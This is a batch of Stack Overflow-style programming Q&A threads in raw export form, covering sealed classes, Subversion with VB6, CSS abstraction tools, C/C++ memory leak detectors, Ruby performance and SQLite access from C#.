<p>As a perfect example, I was recently creating a small package (Java, not C#, but same principles) to wrap functionality around the memcached tool.  I wanted an interface so in tests I could mock away the memcached client API I was using, and also so we could switch clients if the need arose (there are 2 clients listed on the memcached homepage).  Additionally, I wanted to have the opportunity to replace the functionality altogether if the need or desire arose (such as if the memcached servers are down for some reason, we could potentially hot swap with a local cache implementation instead).</p>

<p>I exposed a minimal interface to interact with the client API, and it would have been awesome to extend the client API class and then just add an implements clause with my new interface.  The methods that I had in the interface that matched the actual interface would then need no further details and so I wouldn't have to explicitly implement them.  However, the class was sealed, so I had to instead proxy calls to an internal reference to this class.  The result: more work and a lot more code for no real good reason.</p>

<p>That said, I think there are potential times when you might want to make a class sealed... and the best thing I can think of is an API that you will invoke directly, but allow clients to implement.  For example, a game where you can program against the game... if your classes were not sealed, then the players who are adding features could potentially exploit the API to their advantage.  This is a very narrow case though, and I think any time you have full control over the codebase, there really is little if any reason to make a class sealed.</p>

<p>This is one reason I really like the Ruby programming language... even the core classes are open, not just to extend but to ADD AND CHANGE functionality dynamically, TO THE CLASS ITSELF!  It's called monkeypatching and can be a nightmare if abused, but it's damn fun to play with!</p>
 <p>Not everything that's important in a class is asserted easily in code. There can be semantics and relationships present that are easily broken by inheriting and overriding methods. Overriding one method at a time is an easy way to do this.  You design a class/object as a single meaningful entity and then someone comes along and thinks if a method or two were 'better' it would do no harm.  That may or may not be true.  Maybe you can correctly separate all methods between private and not private or virtual and not virtual but that still may not be enough. Demanding inheritance of all classes also puts a huge additional burden on the original developer to foresee all the ways an inheriting class could screw things up.<br />
I don't know of a perfect solution. I'm sympathetic to preventing inheritance but that's also a problem because it hinders unit testing. </p>
 <blockquote>
  <p>I exposed a minimal interface to interact with the client API, and it would have been awesome to extend the client API class and then just add an implements clause with my new interface. The methods that I had in the interface that matched the actual interface would then need no further details and so I wouldn't have to explicitly implement them. However, the class was sealed, so I had to instead proxy calls to an internal reference to this class. The result: more work and a lot more code for no real good reason.</p>
</blockquote>

<p>Well, there is a reason: your code is now somewhat insulated from changes to the memcached interface.</p>
 <blockquote>
  <p><strong>Performance:</strong> (…) if the JIT compiler sees a call to a virtual method using a sealed types, the JIT compiler can produce more efficient code by calling the method non-virtually.(…)</p>
</blockquote>

<p>That's a great reason indeed. Thus, for performance-critical classes, <code>sealed</code> and friends make sense.</p>

<p>All the other reasons I've seen mentioned so far boil down to ""nobody touches my class!"". If you're worried someone might misunderstand its internals, you did a poor job documenting it. You can't possibly know that there's nothing useful to add to your class, or that you already know every imaginable use case for it. Even if you're right and the other developer shouldn't have used your class to solve their problem, using a keyword isn't a great way of preventing such a mistake. Documentation is. If they ignore the documentation, their loss.</p>
 <p>The only legitimate use of inheritance is to define a particular case of a base class like, for example, when inherit from Shape to derive Circle. To check this look at the relation in opposite direction: is a Shape a generalization of Circle? If the answer is yes then it is ok to use inheritance.</p>

<p>So if you have a class for which there can not be any particular cases that specialize its behavior it should be sealed.</p>

<p>Also due to LSP (Liskov Substitution Principle) one can use derived class where base class is expected and this is actually imposes the greatest impact from use of inheritance: code using base class <em>may be given an inherited class and it still has to work as expected</em>. In order to protect external code when there is no obvious need for subclasses you seal the class and its clients can rely that its behavior will not be changed. Otherwise external code needs to be explicitly designed to expect possible changes in behavior in subclasses.</p>

<p>A more concrete example would be Singleton pattern. You need to seal singleton to ensure one can not break the ""singletonness"".</p>
 <p>From an object-oriented perspective, sealing a class clearly documents the author's intent without the need for comments.  When I seal a class I am trying to say that this class was designed to encapsulate some specific piece of knowledge or some specific service.  It was not meant to be enhanced or subclassed further.</p>

<p>This goes well with the Template Method design pattern.  I have an interface that says ""I perform this service.""  I then have a class that implements that interface.  But, what if performing that service relies on context that the base class doesn't know about (and shouldn't know about)?  What happens is that the base class provides virtual methods, which are either protected or private, and these virtual methods are the hooks for subclasses to provide the piece of information or action that the base class does not know and cannot know.  Meanwhile, the base class can contain code that is common for all the child classes.  These subclasses would be sealed because they are meant to accomplish that one and only one concrete implementation of the service.</p>

<p>Can you make the argument that these subclasses should be further subclassed to enhance them?  I would say no because if that subclass couldn't get the job done in the first place then it should never have derived from the base class.  If you don't like it then you have the original interface, go write your own implementation class.</p>

<p>Sealing these subclasses also discourages deep levels of inheritence, which works well for GUI frameworks but works poorly for business logic layers.</p>
 <p>Most of answers (when abstracted) state that sealed/finalized classes are tool to protect other programmers against potential mistakes. There is a blurry line between meaningful protection and pointless restriction. But as long as programmer is the one who is expected to understand the program, I see no hardly any reasons to restrict him from reusing parts of a class. Most of you talk about classes. But it's all about objects!</p>

<p>In his first post, DrPizza claims that designing inheritable class means anticipating possible extensions. Do I get it right that you think that class should be inheritable only if it's likely to be extended well? Looks as if you were used to design software from the most abstract classes. Allow me a brief explanation of how do I think when designing:</p>

<p>Starting from the very concrete objects, I find characteristics and [thus] functionality that they have in common and I abstract it to superclass of those particular objects. This is a way to reduce code duplicity.</p>

<p>Unless developing some specific product such as a framework, I should care about <strong>my</strong> code, not others (virtual) code. The fact that others might find it useful to reuse my code is a nice bonus, not my primary goal. If they decide to do so, it's their responsibility to ensure validity of extensions. This applies team-wide. Up-front design is crucial to productivity. </p>

<p>Getting back to my idea: Your objects should primarily serve your purposes, not some possible shoulda/woulda/coulda functionality of their subtypes. Your goal is to solve given problem. Object oriented languages uses fact that many problems (or more likely their subproblems) are similar and therefore existing code can be used to accelerate further development.</p>

<p>Sealing a class forces people who could possibly take advantage of existing code WITHOUT ACTUALLY MODIFYING YOUR PRODUCT to reinvent the wheel. (This is a crucial idea of my thesis: Inheriting a class doesn't modify it! Which seems quite pedestrian and obvious, but it's being commonly ignored).</p>

<p>People are often scared that their ""open"" classes will be twisted to something that can not substitute its ascendants. So what? Why should you care? No tool can prevent bad programmer from creating bad software!</p>

<p>I'm not trying to denote inheritable classes as the ultimately correct way of designing, consider this more like an explanation of my inclination to inheritable classes. That's the beauty of programming - virtually infinite set of correct solutions, each with its own cons and pros. Your comments and arguments are welcome.</p>

<p>And finally, my answer to the original question: I'd finalize a class to let others know that I consider the class a leaf of the hierarchical class tree and I see absolutely no possibility that it could become a parent node. (And if anyone thinks that it actually could, then either I was wrong or they don't get me).</p>
"
"Using Subversion with Visual Basic 6 <p>My team is moving from Visual SourceSafe to Subversion soon, while developing/supporting a legacy project in Visual Basic 6.0, so I have a couple of questions:</p>

<ul>
<li>What's the best tool for Subversion IDE integration in Visual Studio 6? (or is it not worth the trouble...)</li>
<li>Are there any best practices for using Subversion with Visual Basic 6.0? (file types to ignore, etc.)</li>
</ul>
 <p>My guess would be to not bother with integration and just use Tortoise SVN in Windows Explorer.</p>

<p>As for file types to ignore, give it a test, checkout, build, and see if any files changed (for modern Visual Studio I tend to ignore the .suo files)</p>
 <p>I would agree that Tortoise SVN in Windows Explorer would be the best way to use SVN with VB6.</p>

<p>The biggest change you will find migrating to SVN is the idea of ""Check out"" and ""Check in"" aren't exactly the same as ""Update"" and ""Commit"". . . thus, any IDE integration with VB6 is limited because VB6 supports MSSCCI, a check-out/check-in mechanism.  I once used TamTam SVN (<a href=""http://www.daveswebsite.com/software/tamtamsvn/index.shtml"">http://www.daveswebsite.com/software/tamtamsvn/index.shtml</a>) with Visual Studio 2003, but stopped since I found it limiting.  Merging/branching/blaming, etc. are very powerful features Tortoise SVN provides that weren't in TamTam. Tigris also has <a href=""http://svnvb6.tigris.org/"">http://svnvb6.tigris.org/</a>, but I have not tried it.</p>

<p>Again, while you quite possibly get an IDE to work with VB6, I would not recommend it since the greatest strength of migrating to SVN is to break the Source Safe philosophy of check-in/check-out.</p>
 <p>For the server side, VisualSVN Server, is a super simple solution, we are running it in a vmware virtual, and its humming along.</p>

<p>If you are a command line guy, I really like the command line interface for svn, I find it less confusing to get to certain actions than tortoise, such as status of the folder. But if you are an explorer fan, tortoise is more than adequate, coming from a source safe world.</p>

<p>The main things to ignore are:</p>

<ul>
<li>Reproducable artifacts (dll, pdb, exe)</li>
<li>Environment specific settings (i.e. the settings file for vs, csproj.user file, .suo files)</li>
</ul>
 <p>Since Subversion uses an update/edit/commit cycle (rather than checkin/checkout), you will need to be especially careful with binary files.  Most forms in VB6 consist of two files: MyForm.frm and MyForm.frx.  The *.frx files are binary, and thus cannot be merged.</p>

<p>Given that, I would set up Subversion to require ""locking"" on .frx files.  This means that only one person can check the file out at a time.  By doing so, you will enforce that only one developer can modify these files at a time, and it is always clear who that person currently is.  If you don't do this, you are setting yourself up for some major headaches.</p>
 <p>Depending how much you're planning to do on these legacy projects I would consider not switching.</p>

<p>When digging through legacy code it really helps to have all the history and blame. SVN is miles better than VSS, but you'll be losing the history when you switch.</p>

<p>If you're going to be a lot of ongoing development in VB6 then it may well be worth switching to SVN, but if you're going to be doing that much going forward is it also worth reviewing the project?</p>

<p>I have a similar problem, only the legacy projects are in Delphi. Were they in VB6 I think I would consider 'upgrading' them to VB.Net, just for maintainability.</p>
 <blockquote>
  <p>Depending how much you're planning to do on these legacy projects I would consider not switching.</p>
</blockquote>

<p>I would really advise you to switch to SVN. I know of a few projects that lost source code because the VSS database became corrupted.</p>

<p>I think there are tools that perform the migration from SourceSafe to SVN. (Yes-- a quick Google search confirmed it.) That way you wouldn't be losing the revision history.</p>
 <h2>File types to ignore:</h2>

<p><code>*.vbw</code><br />
Workspace file that is automatically generated when you close a project, and contains which files you have open etc.</p>

<p><code>MSSCCPRJ.SCC</code><br />
The source control status file generated by the VB6 IDE (if you go with the solution of controlling SVN in Windows Explorer, you should disable the source control plugin in VB6 and this will not be generated).</p>

<p><code>*.log</code><br />
This is files generated if something goes wrong in loading a form GUI. The file is located in the same place as the form file with name equal to the form file.<br />
<em>Example:</em> <code>MyForm.frm</code> generates <code>MyForm.log</code>. </p>

<p>You should of course only do this if you don't have log files that you need in source control...</p>
"
"Abstraction away from CSS <p>Let me make something quite clear.</p>

<p>I. <strong>Hate</strong>. CSS.</p>

<p>It is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..</p>

<p>.. to cut a long story short, it's a pain. A PITA, if you will.</p>

<p>Many frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.</p>

<p>Is there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.</p>

<p>Alternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole? </p>
 <p>What I found works best is to really learn CSS. I mean <strong>really</strong> learn CSS.</p>

<p>It can be a confusing language to learn, but if you read enough about it and practice, eventually you'll learn the best way to do things.</p>

<p>The key is to do it enough that it comes natural. CSS can be very elegant if you know what you want to do before you start and you have enough experience to do it.</p>

<p>Granted, it is also a major PITA to do sometimes, but even cross-browser issues aren't so bad if you <strong>really</strong> practice at it and learn what works and what doesn't, and how to get around problems.</p>

<p>All it takes is practice and in time you can become good at it.</p>
 <p>You can always use a template engine to add variables and caclulated fields to your CSS files.</p>
 <blockquote>
  <p>Then comes the multiple browser issue</p>
</blockquote>

<p>There is <a href=""http://code.google.com/p/ie7-js/"" rel=""nofollow"">this</a> that helps remove some inconsistencies from IE. You can also use jQuery to add some selectors via javascript.</p>

<p>I agree with <a href=""http://stackoverflow.com/questions/25450/abstraction-away-from-css#25462"" rel=""nofollow"">Dan</a>, learn it and it's not so much of a problem, even fun.</p>
 <p>The key to a real understanding of CSS (and the browser headaches) is a solid understanding of the <a href=""http://www.w3.org/TR/REC-CSS2/box.html"" rel=""nofollow"">box model</a> used by the CSS Standards, and the incorrect model used by some browsers. Once you have that down and start learning selectors you will get away from browser specific properties and CSS will become something you look forward to.</p>
 <p>See, this is the problem with SO-- every answer so far has made a valid point and should be considered the final answer. Let me try to sum up:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/25450/abstraction-away-from-css#25457"" rel=""nofollow"">CSS is good</a>! <a href=""http://stackoverflow.com/questions/25450/abstraction-away-from-css#25462"" rel=""nofollow"">To expand further</a>, there is a learning curve but once you learn it many things will be much easier.</li>
<li>(Some) Browser inconsistencies <a href=""http://stackoverflow.com/questions/25450/abstraction-away-from-css#25471"" rel=""nofollow"">are solvable</a> generically.</li>
<li>(Some of your) <a href=""http://stackoverflow.com/questions/25450/abstraction-away-from-css#25467"" rel=""nofollow"">Variable and calculated</a> field functionality can be taken care of through whatever templating engine you use.</li>
</ul>

<p>I think a combination of all these certianly solves a large sum of problems (although to be fair deeply learning CSS is not an option for everyone; some people just don't use it enough to justify the time).</p>

<p>There are some problems none of the above points cover (certain types of calculated fields would require writing a JS library for, me thinks) but it's certainly a good start.</p>
 <p>If by some chance you happen to be using Ruby, there's <a href=""http://haml.hamptoncatlin.com/docs/rdoc/classes/Sass.html"" rel=""nofollow"">Sass</a>. It supports hierarchical selectors (using indentation to establish hierarchies), among other things, which makes life easier to an extend from a syntactical perspective (you repeat yourself a lot less). </p>

<p>I am certainly with you, though. While I would consider myself a small-time CSS expert, I think it would be nice if there were tools for CSS like there are with Javascript (Prototype, JQuery, etc.). You tell the tool what you want, and it handles the browser inconsistencies behind-the-scenes. That would be ideal, methinks.</p>
 <p>This elaborates on my previous answer.</p>

<p>When I first started using CSS I also thought it was a pain that it didn't support variables, expressions, etc.  But as I started to use it more and more, I developed a different style to overcome these issues.  </p>

<p>For example, instead of this:</p>

<pre><code>a { color: red }
.entry { color: red }
h1 { color: red }
</code></pre>

<p>You can do:</p>

<pre><code>a, .entry, h1 { color: red }
</code></pre>

<p>You can keep the color declared in one spot by doing this.</p>

<p>Once you use CSS enough you should be able to overcome most browser inconsistencies easily.  If you find that you need to use a CSS hack there is probably a better way to do it.</p>
 <p>For variable support, I have used PHP with CSS headers to great effect for that. I think you can do it in any language. Here is a php sample: </p>

<pre><code>&lt;?
header('content-type:text/css');
header(""Expires: "".gmdate(""D, d M Y H:i:s"", (time()+900)) . "" GMT""); 

$someColorVar = ""#cc0000"";
?&gt;
BODY {
      background-color: &lt;?= someColorVar ?&gt;;
     }
</code></pre>
 <blockquote>
  <p>Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding</p>
</blockquote>

<p>I only get this when trying to make stuff work in IE.</p>

<p>If you learn CSS to the point where you can code most things without having to look up the reference (if you're still looking up reference regularly you don't really know it and can't claim to complain I think), and then develop for firefox/safari, it's a pretty nice place to be in.</p>

<p>Leave the pain and suffering of IE compatibilit to the end after it works in FF/Safari, so your mind will attribute the blame to IE, where it damn well belongs, rather than CSS in general.</p>
 <p>Also check out <a href=""http://code.google.com/p/blueprintcss/"" rel=""nofollow"">BlueprintCSS</a>, a layout framework in CSS. It doesn't solve all your problems, but many, and you don't have to write the CSS yourself.</p>
 <p>I believe the common errors beginners have with CSS are to do with specificity. If you're styling the <em>a</em> tag, are you sure you really want to be styling every single one in the document or a certain ""class"" of <em>a</em> tags? </p>

<p>I usually start out being very specific with my CSS selectors and generalize them when I see fit.</p>

<p>Here's a humerours article on the subject, but also informational:
<a href=""http://www.stuffandnonsense.co.uk/archives/css_specificity_wars.html"" rel=""nofollow"">Specificity Wars</a></p>
 <p>For CSS frameworks, you could consider <a href=""http://developer.yahoo.com/yui/grids/"" rel=""nofollow"" title=""YUI Grids"">YUI Grids</a>. It makes basic layout a lot quicker and simpler, although used in its raw form it does compromise on semantics.</p>
 <p>CSS takes a bit of time to learn, but the thing I initially found most discouraging was the fact that so many hacks were needed to get all browsers to behave the same way.  Learning a system which doesn't adhere to logic seems dumb... but I've clung to the vague belief that there is logic behind each browser's idiosyncrasy, in the form of the W3 spec.  It seems that the new generation browsers are slowly coming into line - but IE6 still makes my life hell on a daily basis.</p>

<p>Maybe creating an abstraction layer between compliant/valid CSS code and the browsers' shoddy implementations wouldn't be a bad thing.  But if such a thing was created - would it need to be powered by JS (or jQuery)? (and would that create an unreasonably burden, in terms of processing cost?)</p>

<p>I've found that it useful to 'level the ground' when scripting with CSS.  There are probably loads of different flavours of reset script out there - but using YUI resets has helped me to reduce the number of quirks I'd otherwise encounter - and YUI grids make life a little easier sometimes.  </p>
 <p>@SCdF: I think your summary here is fair. But the argument that some people don't have the time to learn CSS is bogus - just think about for a second. Substitute a technology that you've mastered and you'll see why: </p>

<blockquote>
  <p>I. Hate. Java. Is there something out there that will just write it for me? Not everyone has the time to master Java. </p>
</blockquote>

<p>CSS is certainly an imperfect technology - I have high hopes that 5 years from now we won't be dealing with browser incompatibilities any more (we're almost there), and that we'll have better author-side tools (I've written a Visual Studio macro for my own use that provides the the sort of variables and calculations that you describe, so it's not impossible) - but to insist that you should be able to use this technology effectively without really understanding it just isn't reasonable. </p>
 <p>CSS variables <a href=""http://disruptive-innovations.com/zoo/cssvariables/"" rel=""nofollow"">are coming</a> (relatively) soon, but I agree they are long overdue. In the meantime, it is possible to use a CSS templating engine such as Sass, or even the dynamic web language of your choice, to generate your stylesheets programmatically.</p>
 <p>Sorry to say that guys, but all of you missed the point.</p>

<p>The word <em>abstraction</em> is the key. Say you and Sally are making a website. You are styling forms while she makes the corners round. Both you and she have defined a handful of selectors.</p>

<p>What if, unknowingly, you picked class names that clash with the ones of Sally? You see, you can't ""hide"" (abstract out) the details when you work in CSS. That's why you can't fix a bug in IE then create a self-contained solution that others can use as-is, much like you call procedures in a programming language only caring about pre- and postconditions and not thinking of <em>how</em> it works on the inside. You just think of <em>what</em> you want to accomplish.</p>

<p>This is the biggest problem with the web: it completely lacks abstraction mechanisms! Most of you will exclaim, ""It's unnecessary; you stop smoking crack!""</p>

<p>You will instead do the job of say, fixing layout bugs or making round corners or debating on the ""best"" markup for this or that case over and over again. You will find a site that explains the solution, then copy-paste the answer then adapt it to your specific case without even thinking what the hell are you doing! Yes, that's what you will do.</p>

<p>End of the rant.</p>
 <p>You are thinking about this correctly though, you're probably still going to need to understand the different browser implementations of CSS. This is just understanding the environment your application lives in.</p>

<p>To clarify: this isn't about understanding CSS. If you know the language well, you've still got to handle the redundancy, duplication and lack of control structures in the language. </p>

<p>Ive been writing CSS solidly for more than 10 years and I've come to the conclusion that while the language is powerful and effective, implementing CSS sucks. So I use an abstraction layer like <a href=""http://sass-lang.com"" rel=""nofollow"">Sass</a> or <a href=""http://lesscss.org/"" rel=""nofollow"">Less</a> or <a href=""http://xcss.antpaw.org/"" rel=""nofollow"">xCSS</a> to interface to the language. These tools use a syntax similar to CSS so you're solving the problem in the problem's domain. Using something like PHP to write CSS works but is not the best approach.</p>

<p>By hiding the problems in the language through an abstraction layer, you can deliver a better product that will maintain its integrity throughout the full life cycle of your project. Writing CSS by hand accelerates <a href=""http://en.wikipedia.org/wiki/Software_rot"" rel=""nofollow"">software rot</a> unless you're providing solid documentation which most CSS coders aren't. If you're writing a well documented CSS framework, you probably wouldn't write it by hand anyway. It's just not efficient.</p>

<p>Another problem with CSS is due to it's lack of support for nesting block declarations. This encourages coders to build a flat, global set of classes and handle the name collisions with a naming convention. We all know globals are evil but why do we write CSS in such a way? Wouldn't it be better to give your classes a context instead of exposing them to the whole document model? And your naming convention may work but it's just another task you must master to get the language written.</p>

<p>I encourage those of you who pride yourselves on writing good CSS to start applying some of the best practices from programming to your markup. Using an abtraction layer doesn't mean you lack the skill to write good CSS, it means you've limited your exposure to the weaknesses of the language.</p>
 <p>You don’t need an abstraction away from CSS—you need to realize that CSS itself in an abstraction. CSS isn’t about putting pixels just so on the screen. Instead, it’s about writing a system of rules that help the browser make those decisions for you. This is necessary, because at the time you write CSS, you don’t know the content the browser will be applying it to; neither do you know the environment where the browser will be doing it.</p>

<p>Mastering this takes time. You can’t pick up up CSS in a weekend and be good to go. It’s a bit deceiving, because the language has such a low barrier of entry, but the waters run <em>deep</em>. Here is just a few <a href=""https://manning.com/books/css-in-depth"" rel=""nofollow"">of the topics</a> you should seek to master to be proficient in CSS:</p>

<ul>
<li>The Cascade and Inheritance</li>
<li>The Box Model</li>
<li>Layout methods including floats and the new flexbox</li>
<li>Positioning</li>
<li>Current best practices such as SMACSS or BEM to keep your styles modular and easy to maintain</li>
</ul>

<p>You don't need to know this all up front, but you should continue pushing forward. Just as with other languages and programming in general, you need to continually seek to learn more and master the craft. CSS is a fundamental part of web development, and more developers need to treat it with the same respect they afford other languages.</p>
"
"What is the best free memory leak detector for a C/C++ program and its plug-in DLLs? <p>I have a .exe and many plug-in .dll modules that the .exe loads. (I have source for both.) A cross-platform (with source) solution would be ideal, but the platform can be narrowed to WinXP and Visual Studio (7.1/2003 in my case).</p>

<p>The built-in VS leak detector only gives the line where new/malloc was called from, but I have a wrapper for allocations, so a full symbolic stack trace would be best.</p>

<p>The detector would also be able to detect for a leak in both the .exe and its accompanying plug-in .dll modules.</p>
 <p>I have had good experiences with <a href=""http://www.ibm.com/software/awdtools/purify/"">Rational Purify</a>. I have also heard nice things about <a href=""http://valgrind.org/"">Valgrind</a&lt;.</p>
 <p>Try <a href=""http://www.codeproject.com/KB/applications/leakfinder.aspx"" rel=""nofollow"">Jochen Kalmbach's Memory Leak Detector</a> on Code Project.
The URL to the latest version was somewhere in the comments when I last checked.</p>
 <p>I personally use <a href=""http://vld.codeplex.com"">Visual Leak Detector</a>, though it can cause large delays when large blocks are leaked (it displays the contents of the entire leaked block).</p>
 <p>If you don't want to recompile (as Visual Leak Detector requires) I would recommend <a href=""http://www.microsoft.com/whdc/devtools/debugging/default.mspx"">WinDbg</a>, which is both powerful and fast (though it's not as easy to use as one could desire).</p>

<p>On the other hand, if you don't want to mess with WinDbg, you can take a look at <a href=""http://msdn.microsoft.com/en-us/library/ff560206%28VS.85%29.aspx"">UMDH</a>, which is also developed by Microsoft and it's easier to learn.</p>

<p>Take a look at these links in order to learn more about WinDbg, memory leaks and memory management in general:</p>

<ul>
<li><a href=""http://www.codeproject.com/KB/cpp/MemoryLeak.aspx"">Memory Leak Detection Using Windbg</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/c99kz476%28VS.80%29.aspx"">Memory Leak Detection in MFC</a></li>
<li><a href=""http://windbg.info/doc/1-common-cmds.html#20_memory_heap"">Common WinDbg Commands (Thematically Grouped)</a></li>
<li><a href=""http://www.yolinux.com/TUTORIALS/C++MemoryCorruptionAndMemoryLeaks.html"">C/C++ Memory Corruption And Memory Leaks</a></li>
<li><a href=""http://www.memorymanagement.org/"">The Memory Management Reference</a></li>
<li><a href=""http://mcfunley.com/277/using-leakdiag-to-debug-unmanaged-memory-leaks"">Using LeakDiag to Debug Unmanaged Memory Leaks</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/ms810466.aspx"">Heap: Pleasures and Pains</a></li>
</ul>
 <p>As for me I use deleaker to locate leaks. I am pleased.</p>
 <p>My freely available memory profiler <a href=""http://www.puredevsoftware.com/MemPro.htm"" rel=""nofollow"">MemPro</a> allows you to compare 2 snapshots and gives stack traces for all of the allocations.</p>
 <p>As several of my friend has posted there are many free leak detectors for C++.
All of that will cause overhead when running your code, approximatly 20% slower.
I preffer <em>Visual Leak Detector for Visual C++ 2008/2010/2012</em> , you can download the source code from - <a href=""http://vld.codeplex.com/"" rel=""nofollow"">enter link description here</a> . </p>
"
"Ruby Performance <p>I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.</p>

<p>In everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.</p>

<p>Has performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?</p>
 <p>I've actually heard really good things performance with about the JVM implementation, JRuby. Completly anecdotal, but perhaps worth looking into.</p>

<p>See also <a href=""http://en.wikipedia.org/wiki/JRuby#Performance"" rel=""nofollow"">http://en.wikipedia.org/wiki/JRuby#Performance</a></p>
 <p>There are some benchmarks of 1.8 vs 1.9 at <a href=""http://www.rubychan.de/share/yarv_speedups.html"" rel=""nofollow"">http://www.rubychan.de/share/yarv_speedups.html</a>. Overall, it looks like 1.9 is a lot faster in most cases.</p>
 <p>Matz ruby 1.8.6 is much slower when it comes to performance and 1.9 and JRuby do alot to speed it up.  But the performance isn't such that it will prevent you from doing anything you want in a web application.  There are many large Ruby on Rails sites that do just fine with the ""slower interpreted"" language.  When you get to scaling out web apps there are many more pressing performance issues than the speed of the language you are writing it in.</p>
 <p>If scalability and performance are really important to you you can also check out <a href=""http://www.rubyenterpriseedition.com"" rel=""nofollow"">Ruby Enterprise Edition</a>.  It's a custom implementation of the Ruby interpreter that's supposed to be much better about memory allocation and garbage collection.  I haven't seen any objective metrics comparing it directly to JRuby, but all of the anectdotal evidence I've heard has been very very good.</p>

<p>This is from the same company that created <a href=""http://www.modrails.com/"" rel=""nofollow"">Passenger (aka mod_rails)</a> which you should definitely check out as a rails deployment solution if you decide not to go the JRuby route.</p>
 <p>Check out ""Writing Efficient Ruby Code"" from Addison Wesley Professional:</p>

<p><a href=""http://safari.oreilly.com/9780321540034"" rel=""nofollow"">http://safari.oreilly.com/9780321540034</a></p>

<p>I found some very helpful and interesting insights in this short work. And if you sign up for the free 10-day trial you could read it for free. (It's 50 pages and the trial gets you (AFAIR) 100 page views.)</p>

<p><a href=""https://ssl.safaribooksonline.com/promo"" rel=""nofollow"">https://ssl.safaribooksonline.com/promo</a></p>
 <p>I am not a Ruby programmer but I have been pretty tightly involved in a JRuby deployment lately and can thus draw some conclusions. Do not expect to much from JRuby's performance. In interpreted mode, it seems to be somewhere in the range of C Ruby. JIT mode <em>might</em> be faster, but only in theory. In practice, we tried JIT mode on Glassfish for a decently-sized Rails application on a medium-sized server (dual core, 8GB RAM). And the truth is, the JITting took so <em>freakingly</em> much time, that the server needed 20-30 minutes before it answered the first request. Memory usage was astronomic, profiling did not work because the whole system grinded to halt with a profiler attached.</p>

<p>Bottom line: JRuby has its merits (multithreading, solid platform, easy Java integration), but given that interpreted mode is the only mode that worked for us in practice, it may be expected to be no better performance-wise than C Ruby.</p>
 <p>I'd second the recommendation of the use of Passenger - it makes deployment and management of Rails applications trivial</p>
"
"What is the best way to connect and use a sqlite database from C# <p>I've done this before in C++ by including sqlite.h but is there a similarly easy way in C#?</p>
 <p>There is a list of Sqlite wrappers for .Net at <a href=""http://www.sqlite.org/cvstrac/wiki?p=SqliteWrappers"">http://www.sqlite.org/cvstrac/wiki?p=SqliteWrappers</a>. From what I've heard <a href=""http://sqlite.phxsoftware.com/"">http://sqlite.phxsoftware.com/</a> is quite good. This particular one lets you access Sqlite through ADO.Net just like any other database.</p>
 <p><a href=""http://www.sourceforge.net/projects/sqlite-dotnet2"">ADO.NET 2.0 Provider for SQLite</a> has over 200 downloads every day, so I think you are safe using that one.</p>
 <p>I've used this with great success:</p>

<p><a href=""http://system.data.sqlite.org/"" rel=""nofollow"">http://system.data.sqlite.org/</a></p>

<p>Free with no restrictions.</p>

<p>(Note from review: Original site no longer exists.  The above link has a link pointing the the 404 site and has all the info of the original)</p>

<p>--Bruce</p>
 <p>There's also now this option: <a href=""http://code.google.com/p/csharp-sqlite/"">http://code.google.com/p/csharp-sqlite/</a> - a complete port of SQLite to C#.</p>
 <p>I'm with, Bruce.  I AM using <a href=""http://system.data.sqlite.org/"">http://system.data.sqlite.org/</a> with great success as well.  Here's a simple class example that I created:</p>

<pre><code>using System;
using System.Text;
using System.Data;
using System.Data.SQLite;

namespace MySqlLite
{
      class DataClass
      {
        private SQLiteConnection sqlite;

        public DataClass()
        {
              //This part killed me in the beginning.  I was specifying ""DataSource""
              //instead of ""Data Source""
              sqlite = new SQLiteConnection(""Data Source=/path/to/file.db"");

        }

        public DataTable selectQuery(string query)
        {
              SQLiteDataAdapter ad;
              DataTable dt = new DataTable();

              try
              {
                    SQLiteCommand cmd;
                    sqlite.Open();  //Initiate connection to the db
                    cmd = sqlite.CreateCommand();
                    cmd.CommandText = query;  //set the passed query
                    ad = new SQLiteDataAdapter(cmd);
                    ad.Fill(dt); //fill the datasource
              }
              catch(SQLiteException ex)
              {
                    //Add your exception code here.
              }
              sqlite.Close();
              return dt;
  }
}
</code></pre>
 <p>Mono comes with a wrapper, use theirs!</p>

<p><a href=""https://github.com/mono/mono/tree/master/mcs/class/Mono.Data.Sqlite/Mono.Data.Sqlite_2.0"" rel=""nofollow"">https://github.com/mono/mono/tree/master/mcs/class/Mono.Data.Sqlite/Mono.Data.Sqlite_2.0</a> gives code to wrap the actual SQLite dll ( <a href=""http://www.sqlite.org/sqlite-shell-win32-x86-3071300.zip"" rel=""nofollow"">http://www.sqlite.org/sqlite-shell-win32-x86-3071300.zip</a> found on the download page <a href=""http://www.sqlite.org/download.html/"" rel=""nofollow"">http://www.sqlite.org/download.html/</a> ) in a .net friendly way. It works on Linux or Windows.</p>

<p>This seems the thinnest of all worlds, minimizing your dependence on third party libraries. If I had to do this project from scratch, this is the way I would do it.</p>
 <p>Another way of using SQLite database in NET Framework is to use <strong>Fluent-NHibernate</strong>.<br/>
[It is NET module which wraps around NHibernate (ORM module - Object Relational Mapping) and allows to configure NHibernate programmatically (without XML files) with the fluent pattern.]</p>

<p>Here is the brief 'Getting started' description how to do this in C# step by step:</p>

<p><a href=""https://github.com/jagregory/fluent-nhibernate/wiki/Getting-started"" rel=""nofollow"">https://github.com/jagregory/fluent-nhibernate/wiki/Getting-started</a></p>

<p>It includes a source code as an Visual Studio project.</p>
 <p><a href=""https://github.com/praeclarum/sqlite-net"" rel=""nofollow"">https://github.com/praeclarum/sqlite-net</a> is now probably the best option.</p>
"
"Asp.net website first start is very slow <p>The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).</p>

<p>I precompiled the site, but nothing changes. </p>

